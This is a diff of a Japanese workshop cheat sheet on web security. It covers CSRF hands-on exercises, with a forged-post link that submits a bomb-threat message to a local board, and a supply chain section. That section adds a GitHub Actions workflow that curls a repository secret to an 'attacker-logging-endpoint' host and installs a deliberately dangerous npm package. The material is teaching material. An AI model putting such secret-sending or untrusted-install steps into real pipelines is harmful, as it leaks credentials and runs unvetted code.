@@ -1,8 +1,35 @@
 # チートシート
-以下のリポジトリを clone してください
-https://github.com/sasakiy84/csrf-demo
+
+## おおまかな流れ
+
+1. ウェブセキュリティの概要
+   1. ユーザーの資産の列挙
+   2. 攻撃方法の列挙（そのためのフレームワーク）
+   3. 主要な脆弱性の概説
+2. CSRF の例
+   1. CWE での説明
+   2. 他のフレームワークでの位置づけ
+   3. ハンズオン： GET の例
+   4. ハンズオン: cookie の説明と GET ログインの例
+   5. ハンズオン： POST の例
+   6. ハンズオン： CSRF TOKEN
+   7. ハンズオン： 同一オリジンポリシーの確認
+   8. ハンズオン： SameSite Cookie
+   9. ハンズオン： Custom Header
+   10. アプリケーションフレームワークでの対策
+   11. まとめ：ブラウザへの注目
+3.  ソフトウェア・サプライチェーン
+   1. ハンズオン：ソフトウェア・サプライチェーンに乗っかってみる
+      1. HonKit
+      2. Amazon S3
+      3. GitHub Actions
+   2. ハンズオン： GitHub Actions Secret の実験
+   3. 手元での実験
+   4. まとめ：対処の難しさ
 
 ## エンドポイント一覧
+以下のリポジトリを clone してください
+https://github.com/sasakiy84/csrf-demo
 
 1. シナリオ１
   1. この記事について、より詳細に書かれた内容が >> [ここ](http://localhost:3000/1-get-board?text=%E7%A7%81%E3%81%AF%E5%91%BC%E5%A3%B0%E5%B8%82%E5%BD%B9%E6%89%80%E3%82%92%E7%88%86%E7%A0%B4%E3%81%97%E3%81%BE%E3%81%99) << にあります
@@ -41,7 +68,7 @@ https://github.com/sasakiy84/csrf-demo
    1. http://127.0.0.1:4000/4-prepare-custom-header
 
 
-samesite 確認用
+samesite 確認用の POST フォーム
 
 <div>
 <form id="form" action="http://localhost:3000/5-check-cookies" method="post">
@@ -96,6 +123,36 @@ jobs:
     - name: Upload to S3
       run: aws s3 sync --delete --region ap-northeast-1 ./_book s3://YOUR_PUBLISH_BUCKET
 ```
+
+## GitHub secret 実験
+自分の名前を `TEST_SECRET` という変数に入れておく
+
+```yaml
+# .github/secret-test.yaml
+name: test 1
+on:
+  workflow_dispatch:
+
+env:
+  TEST_SECRET: ${{ secrets.TEST_SECRET }}
+
+jobs:
+  test1:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: echo $PWD
+      - run: echo $TEST_SECRET
+      - run: curl http://attacker-logging-endpoint.sasakiy84.net/aaa/$TEST_SECRET
+      - run: npm i sasakiy84/dangerous-npm-repository-test
+```
+
+以下のコマンドで、ローカルに依存関係を追加する。
+```bash
+npm i sasakiy84/dangerous-npm-repository-test
+```
+
+そして、`node_modules/dangerous-npm-repository-test`　の中身を見る
 
 ## ソフトウェア・サプライチェーンの参考リンク
 1. codecov
